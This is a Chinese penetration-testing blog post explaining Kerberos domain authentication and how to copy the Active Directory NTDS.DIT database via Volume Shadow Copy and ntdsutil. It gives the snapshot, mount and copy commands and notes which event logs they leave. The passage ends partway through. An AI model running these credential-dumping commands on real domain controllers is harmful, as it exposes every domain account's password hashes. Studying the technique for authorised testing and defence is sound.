href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url">渗透测试</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" itemprop="url">内网信息收集</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">域环境密码凭证获取</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-09-07T08:42:50.000Z" title="发表于 2023-09-07 16:42:50">2023-09-07</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-09-18T14:07:19.040Z" title="更新于 2023-09-18 22:07:19">2023-09-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">5.7k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>21分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="域环境密码凭证获取"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为东莞"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>东莞</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="/img/default_cover.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div class="post-ai-description"><div class="ai-title"><i class="anzhiyufont anzhiyu-icon-bilibili"></i><div class="ai-title-text">AI-摘要</div><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right"></i><i class="anzhiyufont anzhiyu-icon-circle-dot" title="朗读摘要"></i><div id="ai-tag">Tianli GPT</div></div><div class="ai-explanation">AI初始化中...</div><div class="ai-btn-box"><div class="ai-btn-item">介绍自己 🙈</div><div class="ai-btn-item">生成本文简介 👋</div><div class="ai-btn-item">推荐相关文章 📖</div><div class="ai-btn-item">前往主页 🏠</div><div class="ai-btn-item" id="go-tianli-blog">前往爱发电购买</div></div><script data-pjax src="/js/anzhiyu/ai_abstract.js"></script></div><article class="post-content" id="article-container" itemscope itemtype="https://hihopkc.github.io/posts/14d8.html"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url">渗透测试</a><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" itemprop="url">内网信息收集</a><h1 id="CrawlerTitle" itemprop="name headline">域环境密码凭证获取</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hihopkc</span><time itemprop="dateCreated datePublished" datetime="2023-09-07T08:42:50.000Z" title="发表于 2023-09-07 16:42:50">2023-09-07</time><time itemprop="dateCreated datePublished" datetime="2023-09-18T14:07:19.040Z" title="更新于 2023-09-18 22:07:19">2023-09-18</time></header><h1 id="Windows域认证"><a href="#Windows域认证" class="headerlink" title="Windows域认证"></a>Windows域认证</h1><p>Windows的认证包括三个部分：</p>
+<ul>
+<li>本地认证：用户直接操作计算机登录账户</li>
+<li>网络认证：远程连接到工作组中的某个设备</li>
+<li>域认证：登陆到域环境中的某个设备</li>
+</ul>
+<p>域内认证即采用了 Kerberos 协议的认证机制，与前两者相比最大的区别是有一个可信的第三方机构KDC 的参与</p>
+<h2 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h2><p>活动目录：Active Diretory，AD，是指域环境中提供目录服务的组件。目录用于存储有关网络对象(例如用户、组、共享资源计算机、、打印机和联系人等)的信息。能够快速、准确的从目录中找到其所需的信息的服务，为企业提供了网络环境集中式管理的机制。</p>
+<p>活动目录主要的功能：</p>
+<ul>
+<li>账号集中管理：所有的账户都存储在服务器中，可以方便快捷的执行命令和管理密码等。</li>
+<li>软件集中管理：能够统一推送软件，安装网络打印机等服务器</li>
+<li>环境集中管理：统一客户端桌面、IE等</li>
+<li>增强安全性：统一部署杀软，统一执行病毒扫描任务、集中管理用户的计算机权限，统一指定密码策略。</li>
+<li>更加的可靠更短的宕机时间</li>
+</ul>
+<p>在域中，网络对象可以相互访问，但是在真实情况中，需要对某些部门的计算机进行限制，例如：销售部门不能访问技术部门的服务器。这个中间就需要 Kerberos 认证协议来验证网络对象间的权限。</p>
+<h2 id="Kerberos协议简介"><a href="#Kerberos协议简介" class="headerlink" title="Kerberos协议简介"></a>Kerberos协议简介</h2><ul>
+<li>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为 客户机&#x2F;服务器 应用程序提供强大的认证服务。</li>
+<li>该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。</li>
+<li>在以上情况下， Kerberos 作为一 种可信任的第三方认证服务，是通过传统的密码技术(如:共享密钥)执行认证服务的。</li>
+</ul>
+<p>参与域认证的三个角色：</p>
+<ul>
+<li>访问服务的Client（用户）</li>
+<li>提供服务的Server（服务）</li>
+<li>KDC(Key Distribution Center)密钥分发中心</li>
+</ul>
+<p>在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。</p>
+<h2 id="Kerberos认证协议基础"><a href="#Kerberos认证协议基础" class="headerlink" title="Kerberos认证协议基础"></a>Kerberos认证协议基础</h2><ul>
+<li>票据(Ticket):</li>
+</ul>
+<p>是网络对象互相访问的凭证。</p>
+<ul>
+<li>AD(Account Database):</li>
+</ul>
+<p>存储域中所有用户的用户名和对应的 NTLM Hash，可以理解为域中的SAM数据库，KDC 可以从AD中提取域中所有用户的 NTLM Hash，这是Kerberos 协议能够成功实现的基础。</p>
+<ul>
+<li>KDC(Key Distribution Center):</li>
+</ul>
+<p>密钥分发中心，负责管理票据、认证票据、分发票据，里面包含两个服务：AS 和 TGS</p>
+<p>KDC(Key Distribution Center) &#x3D; DC(Domain Controller) &#x3D; AD（Account Database）+AS（Authenication Service）+ TGS（Ticket Granting Service）</p>
+<p>从物理层面看，AD 与 AS，TGS，KDC均为域控制器(Domain Controller)</p>
+<ul>
+<li>AS(Authentication Server):</li>
+</ul>
+<p>身份认证服务，为 Client 生成 TGT 的服务，也用来完成对 Client 的身份验证</p>
+<ul>
+<li>TGS(Ticket Granting Server):</li>
+</ul>
+<p>票据授予服务,为<code>Client</code>生成允许对某个服务访问的ticket，就是Client从AS那里拿到TGT之后，来TGS这里再申请对某个特定服务或服务器访问的Ticket，只有获取到这个Ticket，Client才有权限去访问对应的服务，该服务提供的票据也称为 TGS 或者叫白银票据</p>
+<ul>
+<li>TGT(Ticket Granting Ticket):</li>
+</ul>
+<p>看英文名就知道，用来生成 Ticket 的 Ticket，由身份认证服务授予的票据(黄金票据)，用于身份认证，存储在内存，默认有效期为10小时</p>
+<p>注意：</p>
+<p><code>Client</code> 密钥、<code>TGS</code> 密钥 和 <code>Service</code> 密钥 均为对应用户的 NTLM Hash</p>
+<p><code>TGS</code>密钥 &#x3D;&#x3D; <code>KDC Hash</code> &#x3D;&#x3D; <code>krbtgt</code> 用户的 <code>NTLM Hash</code></p>
+<p><code>Server</code> 和 Service 可以当作一个东西，就是 Client 想要访问的服务器或者服务</p>
+<p><code>Client/(TGS/Server) Sessionkey</code> 可以看作客户端与 TGS 服务和尝试登陆的 Server 之间会话时用来加密的密钥，而 (Client&#x2F;TGS&#x2F;Service) 密钥(上面提到的三个实际为 NTLM Hash 的密钥)是用来加密会话密钥的密钥，为了保证会话密钥的传输安全，这些加密方式均为对称加密</p>
+<p>参与认证的三个角色的 <code>NTLM Hash</code> 是三个密钥，这三个NTLM Hash的唯一作用是确保会话密钥<code>Sessionkey</code> 的安全传输</p>
+<h2 id="Kerbreros认证流程"><a href="#Kerbreros认证流程" class="headerlink" title="Kerbreros认证流程"></a>Kerbreros认证流程</h2><p>Client向KDC发起服务请求，希望获取访问Server的权限。 KDC得到了这个消息，首先得判断Client是否是可信赖的， 也就是从AD数据库中寻找该用户是否可用来登录。这就是AS服务完成的工作，成功后，AS返回TGT给Client。</p>
+<p>Client得到了TGT后，继续向KDC请求，希望获取访问Server的权限。KDC又得到了这个消息，这时候通过Client 消息中的TGT，判断出了Client拥有了这个权限，给了Client访问Server的权限Ticket。<br>（TGS服务的任务）</p>
+<p>Client得到Ticket后便可以使用这个Ticket成功访问Server。但是这个Ticket只能用来访问这个Server，如果要访问其他Server需要向KDC重新申请。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202309060848475.jpg" alt="1693961052990"></p>
+<h2 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202309060848139.png" alt="image-20230906084835063"></p>
+<ul>
+<li>用户输入 [用户名] 和 [密码] 信息</li>
+<li>在客户端，用户输入的 [密码] 通过计算生成 NTLM 哈希作做为 [CLIENT密钥]</li>
+</ul>
+<h2 id="请求身份认证"><a href="#请求身份认证" class="headerlink" title="请求身份认证"></a>请求身份认证</h2><h3 id="客户端向AS-身份认证服务-发送认证请求"><a href="#客户端向AS-身份认证服务-发送认证请求" class="headerlink" title="客户端向AS(身份认证服务)发送认证请求"></a>客户端向AS(身份认证服务)发送认证请求</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202309061111984.png" alt="20201111102706845"></p>
+<ul>
+<li>客户端向AS发送认证请求，请求中带有明文的 [用户名] 信息</li>
+</ul>
+<blockquote>
+<p>此时并未发送[密码]或[密钥]信息</p>
+</blockquote>
+<h3 id="AS确认Client端登录者用户身份"><a href="#AS确认Client端登录者用户身份" class="headerlink" title="AS确认Client端登录者用户身份"></a>AS确认Client端登录者用户身份</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202309061112578.png" alt="2597809-20211126163525401-1380436107"></p>
+<p>AS收到用户认证请求之后，根据请求中的 用户名 信息，从数据库中查找该用户名是否存在。</p>
+<p>如果 用户名 存在，则根据该用户名提取 NTLM Hash 做为AS生成的CLIENT 密钥，如果第1步中用户提供的 密码 信息正确，该秘钥与用户登录中的 CLIENT密钥 是相等的。</p>
+<p>AS为Client响应如下消息：</p>
+<ul>
+<li><p>Msg A 使用 KDC 生成的 CLIENT密钥 加密的 CLIENT&#x2F;TGS SESSIONKEY</p>
+</li>
+<li><p>Msg B 使用 TGS 密钥 加密的 TGT(TICKET-GRANTING-TICKET)，客户端没有 KDC NTLM Hash 因</p>
+</li>
+<li><p>此 Client 无法解密 TGT 。</p>
+</li>
+<li><p>TGT中包含如下信息：</p>
+<ul>
+<li><p>[Client&#x2F;TGS SessionKey]</p>
+</li>
+<li><p>Client ID</p>
+</li>
+<li><p>Ticket有效时间</p>
+</li>
+<li><p>CLient 地址</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>Client收到AS的响应消息以后，利用自身的 CLIENT 密钥 可以对 Msg A进行解密，这样可以获取到CLIENT&#x2F;TGS SESSIONKEY 。但由于Msg B是使用 TGS 密钥 加密的，Client 无法对其解密。</p>
+<ul>
+<li>AS响应的消息中有一条是属于Client的，但另外一条却属于TGS。</li>
+<li>Client&#x2F;TGS SessionKey 出现了两个Copy，一个给Client端，一个给TGS端。</li>
+<li>认证过程中的加密除哈希外均采用的是对称加密算法。</li>
+</ul>
+<h2 id="请求服务授权"><a href="#请求服务授权" class="headerlink" title="请求服务授权"></a>请求服务授权</h2><h3 id="客户端向TGS发送请求服务授权请求"><a href="#客户端向TGS发送请求服务授权请求" class="headerlink" title="客户端向TGS发送请求服务授权请求"></a>客户端向TGS发送请求服务授权请求</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202309061119822.png" alt="2597809-20211126163532374-831586522 (1)"></p>
+<p>客户端发送的请求中包含如下两个消息：</p>
+<ul>
+<li><p>Msg C</p>
+<ul>
+<li><p>要请求的服务ID, 即 [Service ID]</p>
+</li>
+<li><p>上一步2.2中由AS为 Client 提供的TGT。</p>
+</li>
+</ul>
+</li>
+<li><p>Msg D</p>
+<ul>
+<li>使用 CLIENT&#x2F;TGS SESSIONKEY 加密的 Authenticator 1 {Client ID, Timestamp}。</li>
+</ul>
+</li>
+</ul>
+<p>KDC接收到TGT与其他内容后，会首先使用KDC 的 NTLM Hash解密TGT，只有KDC可以解密TGT，从TGT中提取到 CLIENT&#x2F;TGS SESSIONKEY ，再使用 CLIENT&#x2F;TGS SESSIONKEY 解密Authenticator1，获取到 {Client ID, Timestamp} 并与通过解密TGT获取到的{<code>Client ID, 有效时间</code>}进行对比</p>
+<h3 id="TGS为Client响应服务授权票据"><a href="#TGS为Client响应服务授权票据" class="headerlink" title="TGS为Client响应服务授权票据"></a>TGS为Client响应服务授权票据</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202309061116231.png" alt="2597809-20211126163538998-837013627"></p>
+<p>TGS为Client响应的消息包括：</p>
+<ul>
+<li>Msg E 使用 SERVICE 密钥(服务器的 NTLM HASH) 加密的 CLIENT-TO-SERVER TICKET , 该Ticket中包含了如下信息:<ul>
+<li>[Client&#x2F;Server SessionKey]</li>
+<li>Client网络地址</li>
+<li>Ticket有效时间</li>
+<li>Client ID</li>
+</ul>
+</li>
+<li>Msg F 使用 CLIENT&#x2F;TGS SESSIONKEY 加密的 CLIENT&#x2F;SERVER SESSIONKEY 。</li>
+</ul>
+<p>Msg F 使用了 CLIENT&#x2F;TGS SESSIONKEY 加密，因此，该消息对Client可见。Client对其解密以后可获取到 CLIENT&#x2F;SERVER SESSIONKEY 。</p>
+<p>而 Msg E 使用了 [SERVICE密钥] 加密，该消息可视作是TGS给 Service Server 的消息，只不过由Client一起携带发送给 Service Server</p>
+<h2 id="发送服务请求"><a href="#发送服务请求" class="headerlink" title="发送服务请求"></a>发送服务请求</h2><h3 id="Client向Service-Server发送服务请求"><a href="#Client向Service-Server发送服务请求" class="headerlink" title="Client向Service Server发送服务请求"></a>Client向Service Server发送服务请求</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202309061114814.png" alt="2597809-20211126163544904-1795212547"></p>
+<p>发送的消息中包括：</p>
+<ul>
+<li><p>Msg E 上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client携带的消息。</p>
+</li>
+<li><p>Msg G 由 [Client&#x2F;Server SessionKey] 加密的 Authenticator 2，包含{Client ID, Timestamp}信息。</p>
+</li>
+</ul>
+<blockquote>
+<p>CLIENT&#x2F;SERVER SESSIONKEY 并非直接传输，而是被包含在使用[Service密钥] 加密的 Msg E<br>中。</p>
+<p>既然 [CLIENT&#x2F;SERVER SESSIONKEY] 并不直接明文传输， Client需要向 Service Server 证明自己拥有正确的 CLIENT&#x2F;SERVER SESSIONKEY ，所以，Authenticator 2使用了CLIENT&#x2F;SERVER SESSIONKEY 加密。</p>
+</blockquote>
+<h3 id="Service-Server响应Client"><a href="#Service-Server响应Client" class="headerlink" title="Service Server响应Client"></a>Service Server响应Client</h3><ol>
+<li>SS收到客户端的服务请求之后，先利用自身的 [SERVICE密钥] 对Msg E进行解密，提取出Client-ToServer Ticket, 在3.2步骤中，提到了该Ticket中包含了CLIENT&#x2F;SERVER SESSIONKEY 以及Client ID信息。</li>
+<li>SS使用 CLIENT&#x2F;SERVER SESSIONKEY 解密 Msg G，提取Client ID信息，而后将该 Client ID 与Client-To-Server Ticket 中的Client ID进行比对，如果匹配则说明Client拥有正确的CLIENT&#x2F;SERVER SESSIONKEY 。</li>
+<li>而后，SS 向 Client 响应 Msg H (包含使用 CLIENT&#x2F;SERVER SESSIONKEY 加密的 Timestamp 信息)。</li>
+<li>Client 收到SS的响应消息Msg H之后，再使用 CLIENT&#x2F;SERVER SESSIONKEY 对其解密，提取Timestamp信息，然后确认该信息与Client 发送的 Authenticator 2 中的 Timestamp 信息一致。</li>
+</ol>
+<p>如上信息可以看出来，该交互过程起到了Client与SS之间的“双向认证”作用。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202309061116377.png" alt="2597809-20211126163551975-799047450"></p>
+<h1 id="活动目录数据库"><a href="#活动目录数据库" class="headerlink" title="活动目录数据库"></a>活动目录数据库</h1><p>Active Directory 域服务AD DS 数据存储：</p>
+<ul>
+<li>由 NTDS.DIT 文件构成，是Active Directory的核心</li>
+<li>默认存储在域控的 %SystemRoot%\ntds\ 文件夹下</li>
+<li>只能通过域控制器进程和协议访问</li>
+</ul>
+<p>活动目录数据库 NTDS.DIT：NTDS.DIT是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。</p>
+<p><strong>在工作组环境中，SAM文件存储着当前主机用户的密码哈希值</strong><br><strong>在域环境中，NTDS.DIT文件存储了域中所有用户的密码哈希值</strong></p>
+<p>因此我们可以通过获取到这两个文件，然后破解得到其中所存储的密码哈希值</p>
+<p>Windows系统为了进一步保护存储的密码哈希值，使用存储在 SYSTEM 注册表配置单元中的密钥对这些哈希值进行加密</p>
+<p>因此想要破解SAM文件与NTDS.DIT文件都需要获取一个SYSTEM文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NTDS.DIT文件位置：%SystemRoot%\NTDS\NTDS.dit（C:\Windows\NTDS\NTDS.dit）</span><br><span class="line">SYSTEM文件位置： %SystemRoot%\System32\config\SYSTEM（C:\Windows\System32\config\SYSTEM）</span><br><span class="line">SAM文件位置： %SystemRoot%\System32\config\SAM（C:\Windows\System32\config\SAM）</span><br></pre></td></tr></table></figure>
+
+<p>由于Window会阻止对这些文件的标准读取或复制操作，如果直接去复制NTDS.DIT文件，会提示文件被系统占用，所以常规的复制下载方法是无法获取到文件副本的，因此需要通过特殊方法来获取。</p>
+<h1 id="Volume-Shadow-Copy"><a href="#Volume-Shadow-Copy" class="headerlink" title="Volume Shadow Copy"></a>Volume Shadow Copy</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service">https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service</a></p>
+</blockquote>
+<p>Volume Shadow Copy Service 卷影复制服务（VSS）是微软从 Windows XP 开始提供的用于创建一致性的时间点副本（也就是快照）的服务框架。用于更好的备份和还原关键业务数据。当所有组件都支持VSS时，可以使用它们来备份应用程序数据，而无需使应用程序脱机。</p>
+<ul>
+<li>用于数据备份</li>
+<li>支持 Windows Server 2003 及以上操作系统</li>
+<li>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间无法确定</li>
+<li>禁用 VSS 会影响系统正常使用，如 System Restore 和 Windows Server Backup</li>
+</ul>
+<p>我们可以利用 Volume Shadow Copy Service 来获取 NTDS.DIT、SAM、SYSTEM 等文件副本。</p>
+<p>注意：</p>
+<ol>
+<li>调用 Volume Shadow Copy 服务会产生SYSTEM日志，Event ID 为7036。</li>
+<li>执行 ntdsutil snapshot “activate instance ntds” create quit quit 会额外产生 EventID 为 98 的日志</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202309071621912.png" alt="image-20230907162054803"></p>
+<h1 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)">https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343(v=ws.11)</a></p>
+</blockquote>
+<p>Ntdsutil.exe 是一个命令行工具，它为 Active Directory 域服务 (AD DS) 和 ActiveDirectory轻型目录服务 (AD LDS) 提供管理工具。您可以使用ntdsutil命令执行 AD DS 的数据库维护，管理和控制单个主机操作，并删除域控制器留下的元数据，这些域控制器在未正确卸载的情况下从网络中删除</p>
+<p>域环境默认安装，要使用 Ntdsutil.exe，必须从管理员命令提示符运行</p>
+<p>如果安装了 AD LDS 服务器角色但未安装 AD DS 服务器角色，则可以使用 dsdbutil.exe 和dsmgmt.exe 命令行工具来执行可以使用 ntdsutil.exe 执行的相同任务。</p>
+<p>支持系统：</p>
+<ul>
+<li>Windows Server 2003</li>
+<li>Windows Server 2008</li>
+<li>Windows Server 2012</li>
+</ul>
+<h2 id="交互式"><a href="#交互式" class="headerlink" title="交互式"></a>交互式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 进入ntdsutil命令行</span><br><span class="line">ntdsutil</span><br><span class="line"></span><br><span class="line"># 进入快照</span><br><span class="line">snapshot</span><br><span class="line"></span><br><span class="line"># 激活 AD DS 实例</span><br><span class="line">activate instance ntds</span><br><span class="line"></span><br><span class="line">create</span><br><span class="line">mount [GUID]</span><br><span class="line">copy C:\$SNAP_202205161140_VOLUMEC$\Windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line"># copy 完之后再执行</span><br><span class="line">unmount [GUID]</span><br><span class="line">del [GUID]</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202309071626278.png" alt="image-20230907162639235"></p>
+<ol>
+<li>以管理员身份打开命令提示符(cmd.exe)</li>
+<li>在命令提示符输入ntdsutil命令</li>
+<li>在ntdsutil提示符下输入</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#激活 AD DS 实例</span><br><span class="line">activate instance ntds</span><br><span class="line"></span><br><span class="line">#为可写（full）和只读域控制器 (RODC) 和 AD LDS 实例创建安装介质。</span><br><span class="line">ifm</span><br><span class="line"></span><br><span class="line">#为可写 Active Directory 域控制器或 AD LDS 实例创建安装介质到指定文件夹中</span><br><span class="line">create full &lt;Drive&gt;:\&lt;Folder&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202309071628738.png" alt="image-20230907162831690"></p>
+<p><code>&lt;Drive&gt;:&amp;lt;Folder&amp;gt;</code> 是要创建文件的文件夹路径。</p>
+<blockquote>
+<p>tree &#x2F;F C:\kc</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202309071629946.png" alt="image-20230907162941913"></p>
+<h2 id="非交互"><a href="#非交互" class="headerlink" title="非交互"></a>非交互</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</span><br><span class="line">copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit</span><br><span class="line">ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<h3 id="查询当前系统的快照"><a href="#查询当前系统的快照" class="headerlink" title="查询当前系统的快照"></a>查询当前系统的快照</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br><span class="line">ntdsutil snapshot &quot;List Mounted&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<h3 id="创建快照"><a href="#创建快照" class="headerlink" title="创建快照"></a>创建快照</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br><span class="line">GUID 为 &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="挂载快照"><a href="#挂载快照" class="headerlink" title="挂载快照"></a>挂载快照</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<p>快照挂载为<code>C:\$SNAP_201908291617_VOLUMEC$\</code></p>
